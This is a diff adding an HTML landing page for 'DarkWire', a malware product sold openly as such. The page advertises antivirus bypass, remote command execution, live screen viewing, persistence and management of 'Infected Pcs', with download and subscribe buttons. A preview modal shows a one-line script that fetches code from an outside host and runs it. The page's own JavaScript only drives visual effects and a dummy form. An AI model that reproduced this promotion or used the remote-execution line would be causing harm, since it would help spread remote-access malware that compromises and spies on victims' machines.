@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>DarkCheatServices | Next-Gen Malware</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet" />
+<link href="https://unpkg.com/aos@2.3.4/dist/aos.css" rel="stylesheet" />  
+<style>
+    html { scroll-behavior: smooth; }
+    body, h1, h2, h3, h4, h5, h6, p, a, button, input, label {
+      font-family: 'Orbitron', sans-serif !important;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+    }
+    body {
+      background: #0a0a0a;
+      color: white;
+      overflow-x: hidden;
+      position: relative;
+      min-height: 100vh;
+      padding-bottom: 6rem;
+    }
+    #particles-js {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+    }
+    .glow-btn {
+      background: #3b82f6;
+      padding: 0.75rem 2.5rem;
+      border-radius: 9999px;
+      color: white;
+      font-weight: 700;
+      font-size: 1rem;
+      letter-spacing: 0.1em;
+      box-shadow: 0 0 8px #3b82f6;
+      transition: transform 0.25s ease, box-shadow 0.25s ease;
+      user-select: none;
+      border: 2px solid #3b82f6;
+    }
+    .glow-btn:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 30px #3b82f6, 0 0 50px #60a5fa;
+      background: linear-gradient(90deg, #3b82f6 0%, #60a5fa 100%);
+    }
+    .glow-btn:focus {
+      outline: none;
+      box-shadow: 0 0 40px #3b82f6, 0 0 70px #60a5fa;
+    }
+    .glow-btn-alt {
+      background: transparent;
+      border: 2px solid #7c3aed;
+      color: #a78bfa;
+      padding: 0.65rem 2rem;
+      font-weight: 700;
+      border-radius: 9999px;
+      letter-spacing: 0.1em;
+      transition: all 0.3s ease;
+    }
+    .glow-btn-alt:hover {
+      background: #7c3aed;
+      color: white;
+      box-shadow: 0 0 25px #7c3aed;
+      transform: scale(1.05);
+    }
+    .hero-buttons > * {
+      margin: 0.5rem 1rem;
+    }
+    .blob {
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(100px);
+      opacity: 0.2;
+      animation: pulse 6s infinite ease-in-out;
+      mix-blend-mode: screen;
+      pointer-events: none;
+    }
+    .blob.blue {
+      width: 300px; height: 300px;
+      background: #3b82f6;
+      top: 10%;
+      left: -10%;
+      animation-delay: 0s;
+    }
+    .blob.purple {
+      width: 250px; height: 250px;
+      background: #7c3aed;
+      bottom: 10%;
+      right: -10%;
+      animation-delay: 3s;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 0.2; transform: scale(1) translateY(0); }
+      50% { opacity: 0.4; transform: scale(1.05) translateY(-10px); }
+    }
+    section {
+      padding-left: 1rem;
+      padding-right: 1rem;
+      max-width: 7xl;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .feature-icon {
+      color: #3b82f6;
+      font-size: 2.5rem;
+      margin-bottom: 1rem;
+      filter: drop-shadow(0 0 3px #3b82f6);
+    }
+    input[type=email] {
+      background: transparent;
+      border: 2px solid #3b82f6;
+      color: white;
+      padding: 0.75rem 1rem;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 1rem;
+      border-radius: 9999px 0 0 9999px;
+      outline: none;
+      transition: border-color 0.3s ease;
+      width: 250px;
+      max-width: 100%;
+    }
+    input[type=email]:focus {
+      border-color: #60a5fa;
+    }
+    button.subscribe-btn {
+      border-radius: 0 9999px 9999px 0;
+      background: #3b82f6;
+      padding: 0.75rem 2rem;
+      font-weight: 700;
+      font-size: 1rem;
+      color: white;
+      border: none;
+      cursor: pointer;
+      transition: background 0.3s ease, box-shadow 0.3s ease;
+    }
+    button.subscribe-btn:hover {
+      background: #60a5fa;
+      box-shadow: 0 0 20px #3b82f6;
+    }
+    #modal {
+      overflow-y: auto;
+    }
+    footer a {
+      transition: color 0.3s ease;
+      font-weight: 700;
+    }
+    footer a:hover {
+      color: #60a5fa;
+    }
+  </style>
+</head>
+<body>
+  <div id="particles-js"></div>
+  <div class="blob blue"></div>
+  <div class="blob purple"></div>
+  <header class="sticky top-0 z-50 bg-black bg-opacity-70 backdrop-blur border-b border-gray-800 shadow">
+    <div class="max-w-7xl mx-auto flex justify-between items-center px-4 py-3">
+      <h1 class="text-xl sm:text-2xl text-blue-400 font-bold tracking-wider">DarkWire</h1>
+      <nav>
+        <a href="#features" class="text-white px-3 py-1 hover:text-blue-400 transition">FEATURES</a>
+        <a href="#getstarted" class="text-white px-3 py-1 hover:text-blue-400 transition">GET STARTED</a>
+        <a href="#newsletter" class="text-white px-3 py-1 hover:text-blue-400 transition">NEWSLETTER</a>
+        <a href="#download" class="text-white border px-4 py-2 rounded hover:bg-blue-500 transition ml-4 text-sm sm:text-base">DOWNLOAD</a>
+      </nav>
+    </div>
+  </header>
+  <section class="text-center mt-24 px-4 max-w-4xl mx-auto" data-aos="fade-up">
+    <h2 class="text-4xl sm:text-6xl font-bold mb-6 tracking-widest drop-shadow-lg">
+      ⚡BYPASS DETECTIONS.<br />EXECUTE PAYLOAD INSTANTLY.
+    </h2>
+    <p class="text-gray-300 text-lg sm:text-xl max-w-3xl mx-auto mb-10 leading-relaxed tracking-wide">
+      FAST, MODERN MALWARE GARUNTEED TO WORK EVERY TIME.
+    </p>
+    <div class="hero-buttons flex justify-center flex-wrap">
+      <a id="download" href="#" class="glow-btn">DOWNLOAD NOW</a>
+      <a href="#getstarted" class="glow-btn-alt">GET STARTED</a>
+      <a href="#newsletter" class="glow-btn-alt">SUBSCRIBE</a>
+    </div>
+  </section>
+  <section id="features" class="mt-32 px-4 max-w-6xl mx-auto" data-aos="fade-up">
+    <h3 class="text-3xl sm:text-4xl font-bold text-center mb-12 tracking-wide">✨ FEATURES</h3>
+    <div class="grid sm:grid-cols-2 lg:grid-cols-3 gap-10 text-center">
+      
+      <div>
+        <svg class="feature-icon mx-auto mb-4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" 
+          viewBox="0 0 24 24" width="48" height="48" aria-hidden="true"><path d="M13 2H6a2 2 0 0 0-2 2v14l4-4 4 4 5-5V4a2 2 0 0 0-2-2h-2z"></path></svg>
+        <h4 class="text-blue-400 font-semibold text-lg mb-2">BYPASSES ANTI-VIRUS</h4>
+        <p class="text-gray-300 text-sm px-3">Avoid detection with secure and stealthy AV BYPASS technology.</p>
+      </div>
+      
+      <div>
+        <svg class="feature-icon mx-auto mb-4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" 
+          viewBox="0 0 24 24" width="48" height="48" aria-hidden="true"><circle cx="12" cy="12" r="10"></circle><path d="M12 6v6l4 2"></path></svg>
+        <h4 class="text-blue-400 font-semibold text-lg mb-2">LAG-FREE</h4>
+        <p class="text-gray-300 text-sm px-3">Built to run fast on every device with zero overhead and optimized resource usage.</p>
+      </div>
+      
+      <div>
+        <svg class="feature-icon mx-auto mb-4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" 
+          viewBox="0 0 24 24" width="48" height="48" aria-hidden="true"><path d="M3 9l9-6 9 6-9 6-9-6z"></path><path d="M21 15l-9 6-9-6"></path></svg>
+        <h4 class="text-blue-400 font-semibold text-lg mb-2">CLEAN INTERFACE</h4>
+        <p class="text-gray-300 text-sm px-3">User interface designed for clarity, speed, and ease of use.</p>
+      </div>
+      <div>
+        <svg class="feature-icon mx-auto mb-4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" 
+          viewBox="0 0 24 24" width="48" height="48" aria-hidden="true"><path d="M12 2a10 10 0 0 0 0 20"></path><path d="M2 12a10 10 0 0 1 20 0"></path></svg>
+        <h4 class="text-blue-400 font-semibold text-lg mb-2">SECURE UPDATES</h4>
+        <p class="text-gray-300 text-sm px-3">Continuous security updates to keep you safe from new protections.</p>
+      </div>
+      <div>
+        <svg class="feature-icon mx-auto mb-4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" 
+          viewBox="0 0 24 24" width="48" height="48" aria-hidden="true"><path d="M3 3h18v18H3z"></path><path d="M3 9h18"></path></svg>
+        <h4 class="text-blue-400 font-semibold text-lg mb-2">MULTI-FEATURE SUPPORT</h4>
+        <p class="text-gray-300 text-sm px-3">Execute remote commands, view screen live, unsiezeable website, and much more.</p>
+      </div>
+      <div>
+        <svg class="feature-icon mx-auto mb-4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" 
+          viewBox="0 0 24 24" width="48" height="48" aria-hidden="true"><path d="M12 12l9-5-9-5-9 5 9 5z"></path><path d="M12 12v9"></path><path d="M12 21l7-5"></path><path d="M12 21l-7-5"></path></svg>
+        <h4 class="text-blue-400 font-semibold text-lg mb-2">FULLY CUSTOMIZABLE</h4>
+        <p class="text-gray-300 text-sm px-3">Run troll commands or add persistence.</p>
+      </div>
+    </div>
+  </section>
+  <section id="getstarted" class="mt-32 max-w-4xl mx-auto text-center px-4" data-aos="fade-up">
+    <h3 class="text-3xl sm:text-4xl font-bold mb-10 tracking-wide">🚀 GET STARTED</h3>
+    <ol class="list-decimal list-inside text-left text-gray-300 space-y-6 text-lg max-w-xl mx-auto">
+      <li>Subscribe to Darkwire.</li>
+      <li>Create custom payloads.</li>
+      <li>Manage Infected Pcs with ease.</li>
+    </ol>
+  </section>
+  <section id="newsletter" class="mt-32 max-w-3xl mx-auto text-center px-4" data-aos="fade-up">
+    <h3 class="text-3xl sm:text-4xl font-bold mb-6 tracking-wide">📧 SUBSCRIBE TO UPDATES</h3>
+    <form class="flex justify-center gap-0 flex-wrap sm:flex-nowrap" onsubmit="subscribe(event)">
+      <input type="email" id="email" name="email" placeholder="YOUR EMAIL ADDRESS" required autocomplete="email" />
+      <button type="submit" class="subscribe-btn">SUBSCRIBE</button>
+    </form>
+    <p id="subscription-msg" class="mt-4 text-sm text-green-400 hidden">Thank you for subscribing!</p>
+  </section>
+  <section class="mt-32 text-center px-4" data-aos="zoom-in">
+    <h3 class="text-2xl font-bold mb-4">🔍 PREVIEW SCRIPT</h3>
+    <button onclick="toggleModal(true)" class="glow-btn mx-auto">SHOW SCRIPT</button>
+  </section>
+  <div id="modal" class="fixed inset-0 bg-black bg-opacity-80 hidden items-center justify-center z-50 p-4 overflow-auto">
+    <div class="bg-gray-900 p-6 rounded-lg w-full max-w-lg relative">
+      <button onclick="toggleModal(false)" class="absolute top-2 right-4 text-gray-400 text-3xl hover:text-white" aria-label="Close">&times;</button>
+      <h4 class="text-lg font-semibold mb-4">SAMPLE SCRIPT</h4>
+      <pre class="bg-black text-green-400 p-4 rounded overflow-auto text-sm select-all" style="white-space: pre-wrap;">
+loadstring(game:HttpGet("https://api.solara-x.dev/script.lua"))()
+      </pre>
+    </div>
+  </div>
+  <footer class="mt-32 text-center text-sm text-gray-400 px-4 pb-10" data-aos="fade-up">
+    <div>CONNECT WITH US:</div>
+    <div class="flex justify-center gap-6 my-3 text-base">
+      <a href="#" class="hover:text-blue-400">DISCORD</a>
+      <a href="#" class="hover:text-blue-400">YOUTUBE</a>
+      <a href="#" class="hover:text-blue-400">TWITTER</a>
+    </div>
+    <p>&copy; 2025 Darkwire. ALL RIGHTS RESERVED.</p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"
+  ></script>
+  <script src="https://unpkg.com/aos@2.3.4/dist/aos.js"
+  ></script>
+  <script>
+    particlesJS("particles-js", {
+      particles: {
+        number: { value: 50 },
+        size: { value: 2 },
+        color: { value: "#3b82f6" },
+        line_linked: { enable: true, color: "#3b82f6", distance: 120 },
+        move: { speed: 0.7 }
+      },
+      interactivity: {
+        events: {
+          onhover: { enable: true, mode: "repulse" },
+          onclick: { enable: false }
+        }
+      }
+    });
+
+    AOS.init({ duration: 700, once: true });
+    function toggleModal(show) {
+      const modal = document.getElementById("modal");
+      if (show) {
+        modal.classList.remove("hidden");
+        modal.classList.add("flex");
+      } else {
+        modal.classList.add("hidden");
+        modal.classList.remove("flex");
+      }
+    }
+  
+ function subscribe(event) {
+      event.preventDefault();
+      const emailInput = document.getElementById('email');
+      const msg = document.getElementById('subscription-msg');
+      if(emailInput.value.trim()) {
+        msg.classList.remove('hidden');
+        emailInput.value = '';
+        setTimeout(() => {
+          msg.classList.add('hidden');
+        }, 4000);
+      }
+    }
+  </script>
+</body>
+</html>
